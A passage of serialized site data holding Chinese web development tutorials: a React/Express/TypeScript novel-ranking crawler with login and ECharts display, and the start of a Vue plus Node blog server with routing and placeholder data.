islogin接口走完了才显示页面\n            if (islogin) { // 登陆了就显示主页\n                return (\n                    <div classname=\"home-border\">\n                        <button type=\"primary\">查看数据</button>\n                        <button type=\"primary\">爬取数据</button>\n                        <button type=\"primary\" onclick={() => { this.logout() }}>退出登陆</button>\n                    </div>\n                );\n            }\n            return <redirect to=\"/login\" />; // 没登录就重定向到登陆页\n        }\n        return null;\n    }\n    // 登出\n    private async logout() {\n        const res = await axios.get('/api/logout');\n        if (res.data?.data) {\n            this.setstate({ islogin: false });\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\nlogin.tsx\n\nimport react from 'react';\nimport { form, input, button, message } from 'antd';\nimport { lockoutlined } from '@ant-design/icons';\nimport axios from 'axios';\nimport qs from 'qs';\nimport { redirect } from 'react-router-dom'\nimport './login.css';\n\ninterface istate { islogin: boolean, loaded: boolean }\n\nexport default class loginview extends react.component<any, istate> {\n    constructor(props: any) {\n        super(props);\n        this.state = { islogin: false, loaded: false };\n        this.submit = this.submit.bind(this);\n    }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setstate后组件会重新渲染\n    componentdidmount() {\n        // ajax请求\n        axios.get('/api/islogin').then((res) => {\n            if (res.data?.data) {\n                this.setstate({ islogin: true, loaded: true });\n            } else {\n                this.setstate({ islogin: false, loaded: true });\n            }\n        });\n    }\n    public render() {\n        const { islogin, loaded } = this.state;\n        if (loaded) { // islogin接口走完了才显示页面\n            if (!islogin) { // 没登陆就显示登陆框\n                return (\n                    <div classname=\"login-border\">\n                        <form name=\"normal_login\" classname=\"login-form\" initialvalues={{ remember: true }} onfinish={this.submit} >\n                            <form.item name=\"password\" rules={[{ required: true, message: '请输入密码！' }]} >\n                                <input\n                                    prefix={<lockoutlined classname=\"site-form-item-icon\" />}\n                                    type=\"password\"\n                                    placeholder=\"password\"\n                                />\n                            </form.item>\n                            <form.item><button type=\"primary\" htmltype=\"submit\" classname=\"login-button\">登陆</button></form.item>\n                        </form>\n                    </div>\n                );\n            }\n            return <redirect to=\"/\"></redirect>; // 登陆了就重定向到主页\n        }\n        return null;\n    }\n    // 点击“登陆”按钮\n    private async submit(values: any) {\n        if (values && values.password) {\n            const res = await axios.post(\n                '/api/login', // 接口名，登陆校验的接口\n                qs.stringify({ password: values.password }), // qs会处理传参，headers得完善\n                { headers: { 'content-type': 'application/x-www-form-urlencoded' } }\n            );\n            if (res.data?.data) {\n                this.setstate({ islogin: true }); // 登陆了更新状态\n            } else {\n                message.error('登陆失败');\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n其实后端也做了修改，主要是去掉后端的/处理，然后给根路径设置为api。\n\nlogincontroller.ts\n\nimport { request, response, nextfunction, requesthandler } from 'express';\nimport 'reflect-metadata';\nimport { controller } from \"../decorator/controllerdecorator\";\nimport { get, post } from \"../decorator/requestdecorator\";\nimport { use } from \"../decorator/usedecorator\";\nimport { getresponse } from '../utils/getresponse';\n\n// 请求体的session\ninterface isession extends cookiesessioninterfaces.cookiesessionobject {\n    login: boolean;\n}\n// 请求体\nexport interface exprequest extends request {\n    body: {\n        [key: string]: string | undefined;\n    },\n    session: isession\n};\n// 登陆状态\nconst islogin = (req: exprequest, res: response): boolean => {\n    return !!(req.session && req.session.login);\n};\n// 登陆状态的中间件\nexport const checklogin: requesthandler = (req: exprequest, res: response, next: nextfunction): void => {\n    if (islogin(req, res)) {\n        next();\n    } else {\n        res.json(getresponse<boolean>(false, '您还没有登陆！请先登陆！'));\n    }\n};\n// 根路径\nconst root: string = '/api';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller(root)\nclass logincontroller {\n    // 登陆校验\n    @post('/login')\n    private loginpost(req: exprequest, res: response): void {\n        if (islogin(req, res)) {\n            res.json(getresponse<boolean>(true));\n        } else {\n            const { password } = req.body;\n            if (password === '123') {\n                // 登陆状态更新\n                req.session.login = true;\n                res.json(getresponse<boolean>(true));\n            } else {\n                res.json(getresponse<boolean>(false, '密码错误！'));\n            }\n        }\n    }\n    // 登出\n    @get('/logout')\n    private logout(req: exprequest, res: response): void {\n        if (islogin(req, res)) {\n            req.session.login = undefined;\n            res.json(getresponse<boolean>(true));\n        } else {\n            res.json(getresponse<boolean>(false, '您本来就是未登录状态！'));\n        }\n    }\n    // 是否已登陆\n    @get('/islogin')\n    private isloginapi(req: exprequest, res: response): void {\n        res.json(getresponse<boolean>(islogin(req, res)));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n\n# 爬取和展示\n\n爬取：爬取按钮在主页，需要添加一个onclick事件，然后请求/api/data接口，接口返回后提示用户爬取成功或者失败。\n\n展示：展示就使用echarts，根据我们的需要选择一个柱状图，将链接里的实例复制过来。\n\n首先导入import reactecharts from 'echarts-for-react'，然后使用这个标签<reactecharts option={this.getoption()} onevents={this._onevents} />，需要在getoption方法里给这个图表赋予数据。那么得请求/api/show接口，然后存储在state中。具体在getoption中将state中存储的数据转化为echarts所需要的数据，也就是之前复制过来的实例。转化的过程中还需要参考配置项，比如标签的单选等。\n\nimport react from 'react';\nimport { redirect } from 'react-router-dom'\nimport './home.css';\nimport { button, message } from 'antd';\nimport reactecharts from 'echarts-for-react';\nimport axios from 'axios';\n\n// 汇总信息（所有榜单的汇总）\ninterface irankinfo {\n    name: string;       // 名字or标题\n    list: irank[]       // 具体榜单\n}\n// 具体榜单信息\ninterface irank {\n    name: string;       // 名字or标题\n    list: ibook[]       // 榜单里的具体小说\n}\n// 小说信息\ninterface ibook {\n    num: string;        // 序号（排名）\n    bookname: string;   // 书名\n    bookcount: string;  // 票数or点击率or人气\n}\n// echarts纵坐标\ninterface iyaxisdata {\n    [key: string]: string[]\n}\n// 切换榜单事件\ntype func = (...args: any[]) => any;\ninterface eventmap {\n    [key: string]: func,\n}\n// react的state\ninterface istate {\n    islogin: boolean;   // 是否登录\n    loaded: boolean;    // 登录接口是否请求完\n    data: irankinfo;    // 排行榜数据\n}\nexport default class homeview extends react.component<any, istate> {\n    // echarts绑定事件\n    private _onevents: eventmap = {\n        'legendselectchanged': this.onlegendchang.bind(this) // 切换榜单事件\n    };\n    private _yaxisdata: iyaxisdata = {}; // 纵坐标\n    constructor(props: any) {\n        super(props);\n        this.state = { islogin: false, loaded: false, data: { name: '', list: [] } }; // 初始化state\n        this.crawlerdata = this.crawlerdata.bind(this); // 给事件绑定this\n        this.logout = this.logout.bind(this);           // 给事件绑定this\n    }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setstate后组件会重新渲染\n    public async componentdidmount() {\n        // 是否登录\n        const isloginres = await axios.get('/api/islogin');\n        if (isloginres.data?.data) {\n            this.setstate({ islogin: true, loaded: true });\n        } else {\n            this.setstate({ islogin: false, loaded: true });\n        }\n        const showres = await axios.get('/api/show');\n        if (showres.data?.data) {\n            this.setstate({ data: showres.data.data });\n        } else {\n            message.error('展示数据获取失败！');\n        }\n    }\n    // 渲染组件\n    public render() {\n        const { islogin, loaded } = this.state;\n        if (loaded) { // islogin接口走完了才显示页面\n            if (islogin) { // 登陆了就显示主页\n                return (\n                    <div classname=\"home-border\">\n                        <div classname=\"buttons\">\n                            <button type=\"primary\" onclick={this.crawlerdata}>爬取数据</button>\n                            <button type=\"primary\" onclick={this.logout}>退出登陆</button>\n                        </div>\n                        <reactecharts option={this.getoption()} onevents={this._onevents} />\n                    </div>\n                );\n            }\n            return <redirect to=\"/login\" />; // 没登录就重定向到登陆页\n        }\n        return null;\n    }\n    // 登出\n    private async logout() {\n        const res = await axios.get('/api/logout');\n        if (res.data?.data) {\n            this.setstate({ islogin: false });\n        } else {\n            message.error('退出失败！');\n        }\n    }\n    // 爬取一次数据\n    private async crawlerdata() {\n        const res = await axios.get('/api/data');\n        if (res.data?.data) {\n            message.success('爬取成功！');\n        } else {\n            message.error('爬取失败！');\n        }\n    }\n    // echarts数据，类型注解先从'echarts-for-react'找不到合适的再去'echarts'的类型定义文件里找\n    private getoption(): echarts.echartoption {\n        const data: irankinfo = this.state.data;\n        const title = data.list.length ? '数据来自纵横中文网' : '';\n        const legendarr: string[] = [];\n        const series: echarts.echartoption.series[] = [];\n        data.list.foreach((value: irank, index: number) => {\n            legendarr.push(value.name);\n            // 保证book是按照num降序排列\n            const booklist = value.list.sort((a, b) => parseint(b['num']) - parseint(a['num']));\n            const bookdata: number[] = [];\n            const namearr: string[] = [];\n            booklist.foreach((value: ibook, index: number) => {\n                bookdata.push(parseint(value.bookcount));\n                namearr.push(value.bookname);\n            });\n            this._yaxisdata[value.name] = namearr;\n            series.push({ name: value.name, type: 'bar', data: bookdata });\n        });\n        return {\n            title: {\n                text: data.name,\n                subtext: title\n            },\n            legend: {\n                selectedmode: 'single', // 单选\n                data: legendarr\n            },\n            tooltip: {                  // 数据悬浮显示\n                trigger: 'axis',\n                axispointer: {\n                    type: 'shadow'\n                }\n            },\n            grid: {\n                left: '3%',\n                right: '4%',\n                bottom: '3%',\n                containlabel: true\n            },\n            xaxis: {\n                type: 'value',\n                boundarygap: [0, 0.01]\n            },\n            yaxis: {\n                type: 'category',\n                data: this._yaxisdata[legendarr[0]]\n            },\n            series\n        };\n    }\n    // 切换榜单\n    private onlegendchang(param: any, echarts: echarts.echarts) {\n        // console.log('param', param);\n        // console.log('echarts', echarts);\n        const option = echarts.getoption();\n        if (option != null) {\n            option.yaxis = {\n                type: 'category',\n                data: this._yaxisdata[param.name]\n            }\n        }\n        echarts.setoption(option);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n\n\n\n# 统一前后端接口类型注解\n\n因为前后端接口传递的数据是一样的，那么可以让它们用同一份类型定义文件。分别放到前后端的src目录下即可，对应前后端接口相关的类型就使用下面这份类型定义。\n\nresrlt.d.ts\n\ndeclare namespace resrlt {\n    // 汇总信息（所有榜单的汇总）\n    interface irankinfo {\n        name: string;       // 名字or标题\n        list: irank[]       // 具体榜单\n    }\n    // 具体榜单信息\n    interface irank {\n        name: string;       // 名字or标题\n        list: ibook[]       // 榜单里的具体小说\n    }\n    // 小说信息\n    interface ibook {\n        num: string;        // 序号（排名）\n        bookname: string;   // 书名\n        bookcount: string;  // 票数or点击率or人气\n    }\n    type loginres = boolean;\n    type logoutres = boolean;\n    type isloginres = boolean;\n    type datares = boolean;\n    type showres = irankinfo | boolean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",charsets:{cjk:!0}},{title:"小爬虫项目简介",frontmatter:{},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/",relativePath:"book-web/项目/react+express+ts写爬虫/README.md",key:"v-7ed37872",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/",headers:[{level:2,title:"前述",slug:"前述",normalizedTitle:"前述",charIndex:14},{level:2,title:"使用技术",slug:"使用技术",normalizedTitle:"使用技术",charIndex:89},{level:2,title:"项目地址",slug:"项目地址",normalizedTitle:"项目地址",charIndex:229},{level:2,title:"后端项目启动",slug:"后端项目启动",normalizedTitle:"后端项目启动",charIndex:330},{level:2,title:"前端项目启动",slug:"前端项目启动",normalizedTitle:"前端项目启动",charIndex:546}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"前述 使用技术 项目地址 后端项目启动 前端项目启动",content:'# 小爬虫项目简介\n\n\n# 前述\n\n只是爬取网页的静态数据，使用的是superagent配合cheerio。爬取动态数据可以使用puppeteer，本项目并没有使用它。\n\n\n# 使用技术\n\nexpress：node后端的一个最基础的框架，在本项目中用于实现爬取数据、存储数据、给前端提供接口。\n\nreact：前端的一个流行框架，在本项目中用于实现登陆、展示爬虫数据。\n\nts：前端语言，js的超集，在本项目中使用它做静态类型检查，规避很多低级错误。\n\n\n# 项目地址\n\n前端：https://gitee.com/liawnliu/crawler_react\n\n后端：https://gitee.com/liawnliu/crawler_express\n\n\n# 后端项目启动\n\n * 先下载项目到本地git clone https://gitee.com/liawnliu/crawler_express.git；\n * 然后用npm初始化项目npm install，可能会出现node版本不对的问题，切到node版本为14.5.0；\n * 查看src/index.ts里的express监听的端口有效，前端启动项目时会代理到这里的；\n * 使用npm run dev编译并启动项目。\n\n\n# 前端项目启动\n\n * 先下载项目到本地git clone https://gitee.com/liawnliu/crawler_react.git；\n * 然后用npm初始化项目npm install，可能会出现node版本不对的问题，切到node版本为14.5.0；\n * 因为creat-react-app这个脚手架版本的问题，可以进入前端项目的docs查看解决方案；\n * 确认好后端项目先启动，在package.json中有"proxy": "http://localhost:7001"，确保后端使用的端口是7001（保持一致）；\n * 准备完毕后就可以使用npm run start启动项目了。',normalizedContent:'# 小爬虫项目简介\n\n\n# 前述\n\n只是爬取网页的静态数据，使用的是superagent配合cheerio。爬取动态数据可以使用puppeteer，本项目并没有使用它。\n\n\n# 使用技术\n\nexpress：node后端的一个最基础的框架，在本项目中用于实现爬取数据、存储数据、给前端提供接口。\n\nreact：前端的一个流行框架，在本项目中用于实现登陆、展示爬虫数据。\n\nts：前端语言，js的超集，在本项目中使用它做静态类型检查，规避很多低级错误。\n\n\n# 项目地址\n\n前端：https://gitee.com/liawnliu/crawler_react\n\n后端：https://gitee.com/liawnliu/crawler_express\n\n\n# 后端项目启动\n\n * 先下载项目到本地git clone https://gitee.com/liawnliu/crawler_express.git；\n * 然后用npm初始化项目npm install，可能会出现node版本不对的问题，切到node版本为14.5.0；\n * 查看src/index.ts里的express监听的端口有效，前端启动项目时会代理到这里的；\n * 使用npm run dev编译并启动项目。\n\n\n# 前端项目启动\n\n * 先下载项目到本地git clone https://gitee.com/liawnliu/crawler_react.git；\n * 然后用npm初始化项目npm install，可能会出现node版本不对的问题，切到node版本为14.5.0；\n * 因为creat-react-app这个脚手架版本的问题，可以进入前端项目的docs查看解决方案；\n * 确认好后端项目先启动，在package.json中有"proxy": "http://localhost:7001"，确保后端使用的端口是7001（保持一致）；\n * 准备完毕后就可以使用npm run start启动项目了。',charsets:{cjk:!0}},{title:"环境搭建",frontmatter:{},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"book-web/项目/用vue+node开发博客项目/1.环境搭建.md",key:"v-07dfe18d",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"用Vue CLI新建前端项目",slug:"用vue-cli新建前端项目",normalizedTitle:"用vue cli新建前端项目",charIndex:11},{level:2,title:"不使用脚手架新建项目",slug:"不使用脚手架新建项目",normalizedTitle:"不使用脚手架新建项目",charIndex:413}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"用Vue CLI新建前端项目 不使用脚手架新建项目",content:"# 环境搭建\n\n\n# 用Vue CLI新建前端项目\n\nVue CLI是Vue脚手架，可以使用它快速生成一个简易Vue项目。\n\n * 在前端的workspace下打开终端，例如Git Bash Here，然后使用npm install -g @vue/cli安装Vue CLI。\n * 终端不要关，继续输入vue create blog-client，其中blog-client是bolg的前端项目名。暂时是选择Vue2版本。\n * 等待一段时间后，blog-client项目就生成好了。如果生成失败，可以使用代理或者使用淘宝镜像。\n * 安装Vue开发调试工具，打开chrome网上应用店，在搜索栏里搜索“Vue.js devtools”，确认一下提供方是[https://vuejs.org]，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n * 以上步骤其实都在学习vue的准备工作这篇文章里说过了。\n\n\n# 不使用脚手架新建项目\n\n * 在后端的workspace下新建blog-server文件夹，进入这个文件夹，打开终端，例如Git Bash Here，然后使用npm init和git init命令初始化项目。\n\n * 在项目根目录下新建bin目录，生成一个wwww.js（对应的在package.json里修改\"main\": \"bin/wwww.js\"）：\n   \n   const http = require('http');\n   const serverHandler = require('../app');\n   \n   const port = 8000;\n   \n   const server = http.createServer(serverHandler);\n   server.listen(port, () => console.log('服务已启动'));\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * 在项目根目录下新建app.js：\n   \n   const serverHandler = (req, res) => {\n       res.setHeader('Content-Type', 'application/json');\n       const resData = {\n           name: 'blog',\n           site: '',\n           env: process.env.NODE_ENV\n       }\n       res.end(JSON.stringify(resData))\n   }\n   module.exports = serverHandler;\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   \n\n * 我们需要区分是开发环境还是线上环境，使用npm install cross-env -D安装它。\n\n * 我们需要使用nodemon来监视js的修改并自动重启，使用npm install nodemon -D安装它。\n\n * 打开package.json，在scripts里添加\"dev\": \"cross-env NODE_ENV=dev nodemon ./bin/www.js\"和\"prod\": \"cross-env NODE_ENV=production nodemon ./bin/www.js\"\n\n * 在项目根目录下添加.gitignore文件，在里面添上node_modules、.git、.vscode。",normalizedContent:"# 环境搭建\n\n\n# 用vue cli新建前端项目\n\nvue cli是vue脚手架，可以使用它快速生成一个简易vue项目。\n\n * 在前端的workspace下打开终端，例如git bash here，然后使用npm install -g @vue/cli安装vue cli。\n * 终端不要关，继续输入vue create blog-client，其中blog-client是bolg的前端项目名。暂时是选择vue2版本。\n * 等待一段时间后，blog-client项目就生成好了。如果生成失败，可以使用代理或者使用淘宝镜像。\n * 安装vue开发调试工具，打开chrome网上应用店，在搜索栏里搜索“vue.js devtools”，确认一下提供方是[https://vuejs.org]，安装它之后，点开这个扩展程序，将“允许访问文件网址”打开。\n * 以上步骤其实都在学习vue的准备工作这篇文章里说过了。\n\n\n# 不使用脚手架新建项目\n\n * 在后端的workspace下新建blog-server文件夹，进入这个文件夹，打开终端，例如git bash here，然后使用npm init和git init命令初始化项目。\n\n * 在项目根目录下新建bin目录，生成一个wwww.js（对应的在package.json里修改\"main\": \"bin/wwww.js\"）：\n   \n   const http = require('http');\n   const serverhandler = require('../app');\n   \n   const port = 8000;\n   \n   const server = http.createserver(serverhandler);\n   server.listen(port, () => console.log('服务已启动'));\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   \n\n * 在项目根目录下新建app.js：\n   \n   const serverhandler = (req, res) => {\n       res.setheader('content-type', 'application/json');\n       const resdata = {\n           name: 'blog',\n           site: '',\n           env: process.env.node_env\n       }\n       res.end(json.stringify(resdata))\n   }\n   module.exports = serverhandler;\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   \n\n * 我们需要区分是开发环境还是线上环境，使用npm install cross-env -d安装它。\n\n * 我们需要使用nodemon来监视js的修改并自动重启，使用npm install nodemon -d安装它。\n\n * 打开package.json，在scripts里添加\"dev\": \"cross-env node_env=dev nodemon ./bin/www.js\"和\"prod\": \"cross-env node_env=production nodemon ./bin/www.js\"\n\n * 在项目根目录下添加.gitignore文件，在里面添上node_modules、.git、.vscode。",charsets:{cjk:!0}},{title:"开发接口",frontmatter:{},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/2.%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3.html",relativePath:"book-web/项目/用vue+node开发博客项目/2.开发接口.md",key:"v-040fd3b4",path:"/book-web/%E9%A1%B9%E7%9B%AE/%E7%94%A8vue+node%E5%BC%80%E5%8F%91%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/2.%E5%BC%80%E5%8F%91%E6%8E%A5%E5%8F%A3.html",headers:[{level:2,title:"原始Node开发接口",slug:"原始node开发接口",normalizedTitle:"原始node开发接口",charIndex:11},{level:3,title:"初始化路由",slug:"初始化路由",normalizedTitle:"初始化路由",charIndex:26},{level:3,title:"分层-数据模型",slug:"分层-数据模型",normalizedTitle:"分层-数据模型",charIndex:2363},{level:3,title:"分层-数据处理",slug:"分层-数据处理",normalizedTitle:"分层-数据处理",charIndex:3240},{level:3,title:"分层-路由",slug:"分层-路由",normalizedTitle:"分层-路由",charIndex:4620},{level:3,title:"要处理好异步的postData",slug:"要处理好异步的postdata",normalizedTitle:"要处理好异步的postdata",charIndex:6976}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"原始Node开发接口 初始化路由 分层-数据模型 分层-数据处理 分层-路由 要处理好异步的postData",content:"# 开发接口\n\n\n# 原始Node开发接口\n\n\n# 初始化路由\n\n在项目根目录下新建src目录，在该目录下新建router文件夹。然后在router文件夹新建user.js和blog.js，这两个文件就是两个不同的功能模块，用于处理各自的路由。\n\nconst { URL } = require('url');\nconst handleBlogRouter = require('./src/router/blog');\nconst handleUserRouter = require('./src/router/user');\n\nconst serverHandler = (req, res) => {\n    // url信息\n    console.log('req.url', req.url)\n    console.log('req.headers.host', req.headers.host)\n    req.path = new URL(req.url, `http://${req.headers.host}`);\n    res.setHeader('Content-Type', 'application/json');\n    res.statusCode = 200;\n    const blogData = handleBlogRouter(req, res);\n    if (blogData) {\n        res.end(JSON.stringify(blogData))\n        return;\n    }\n    const userData = handleUserRouter(req, res);\n    if (userData) {\n        res.end(JSON.stringify(userData))\n        return;\n    }\n    // 没有请求到正确的路由\n    res.writeHead(404, { \"Content-Type\": 'text/plain' });\n    res.write(\"404 Not Found\");\n    res.end();\n}\nmodule.exports = serverHandler;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nconst handleUserRouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    console.log('method', method)\n    console.log('pathname', pathname)\n    if (method === 'POST' && pathname === '/api/user/login') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n}\n\nmodule.exports = handleUserRouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nconst handleBlogRouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    console.log('method', method)\n    console.log('pathname', pathname)\n    if (method === 'GET' && pathname === '/api/blog/list') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'GET' && pathname === '/api/blog/detail') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'POST' && pathname === '/api/blog/new') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'POST' && pathname === '/api/blog/update') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n    if (method === 'POST' && pathname === '/api/blog/del') {\n        return { msg: `请求成功，请求类型是${method}，接口是${pathname}` }\n    }\n}\n\nmodule.exports = handleBlogRouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 分层-数据模型\n\n上一节还未进行分层处理，我们需要对处理响应的逻辑进行分层，分为：数据模型、路由、数据处理。\n\n在src下新建文件夹model，它是用来存放数据模型，我们现在所需的数据模型暂时是：成功ResSuccModel和处理失败ResErrModel。\n\n/src/model/resModel.js\n\n/**\n * 数据模型基类\n */\nclass BaseModel {\n    constructor(data, message) {\n        this.data = data;\n        if (typeof data === 'string') {\n            this.message = data;\n        } else if (message) {\n            this.message = message;\n        }\n    }\n}\n/**\n * 成功后响应的数据模型\n */\nclass ResSuccModel extends BaseModel {\n    constructor(data, message) {\n        super(data, message);\n        this.errno = 0;\n    }\n}\n/**\n * 失败后响应的数据模型\n */\nclass ResErrModel extends BaseModel {\n    constructor(data, message) {\n        super(data, message);\n        this.errno = -1;\n    }\n}\nmodule.exports = {\n    ResSuccModel,\n    ResErrModel\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 分层-数据处理\n\n我们将数据处理这一部分逻辑单独抽离出来，不要与路由处理逻辑混在一起了。\n\n在src下新建文件夹controller，用于存放某些路由对应的数据处理的Js。\n\nconst getBlogList = (author, keyWord) => {\n    // 暂时返回假数据\n    return [\n        {\n            id: '001',\n            title: '标题1',\n            content: '内容1',\n            createTime: 1635150746077,\n            author: '作者1'\n        },\n        {\n            id: '002',\n            title: '标题2',\n            content: '内容2',\n            createTime: 1635150765864,\n            author: '作者2'\n        }\n    ];\n}\nconst getBlogDetail = (id) => {\n    // 暂时返回假数据\n    return {\n        id: '001',\n        title: '标题1',\n        content: '内容1',\n        createTime: 1635150746077,\n        author: '作者1'\n    }\n}\nconst newBlog = (blogData = {}) => {\n    // 返回新建博客的id，表示成功\n    return { id: '003' }\n}\nconst updateBlog = (blogData = {}) => {\n    // 更新成功\n    return true;\n}\nconst deleteBlog = (blogId) => {\n    // 删除成功\n    return true;\n}\nmodule.exports = {\n    getBlogList,\n    getBlogDetail,\n    newBlog,\n    updateBlog,\n    deleteBlog\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\nconst loginCheck = (username, password) => {\n    if (username === 'admin' && password === 'admin') {\n        return true\n    }\n    return false;\n}\nmodule.exports = {\n    loginCheck\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n我们还没有连接数据库，所以接口返回暂时都用的假数据。\n\n\n# 分层-路由\n\n因为分层了，路由这一层需要将数据模型和数据处理这两层的内容引进来。\n\nconst { getBlogList, getBlogDetail, newBlog, updateBlog, deleteBlog } = require('../controller/blog');\nconst { ResSuccModel, ResErrModel } = require('../model/resModel');\n\nconst handleBlogRouter = (req, res) => {\n    const method = req.method;\n    const pathname = req.path.pathname\n    if (method === 'GET' && pathname === '/api/blog/list') {\n        const author = req.path.searchParams.get('author');\n        const keyWord = req.path.searchParams.get('keyWord');\n        const listData = getBlogList(author, keyWord);\n        return new ResSuccModel(listData);\n    }\n    if (method === 'GET' && pathname === '/api/blog/detail') {\n        const id = req.path.searchParams.get('id');\n        const data = getBlogDetail(id);\n        return new ResSuccModel(data);\n    }\n    if (method === 'POST' && pathname === '/api/blog/new') {\n        const blogData = req.body;\n        return new ResSuccModel(newBlog(blogData));\n    }\n    if (method === 'POST' && pathname === '/api/blog/update') {\n        const blogData = req.body;\n        const result = updateBlog(blogData);\n        if (result) {\n            return new ResSuccModel(result, '更新成功');\n        } else {\n            return new ResErrModel(result, '更新失败');\n        }\n    }\n    if (method === 'POST' && pathname === '/api/blog/del') {\n        const blogId = req.body.id;\n        const result = deleteBlog(blogId);\n        if (result) {\n            return new ResSuccModel(result, '删除成功');\n        } else {\n            return new ResErrModel(result, '删除失败');\n        }\n    }\n}\n\nmodule.exports = handleBlogRouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nconst { loginCheck } = require(\"../controller/user\");\nconst { ResSuccModel, ResErrModel } = require('../model/resModel');\n\nconst handleUserRouter = (req, res) 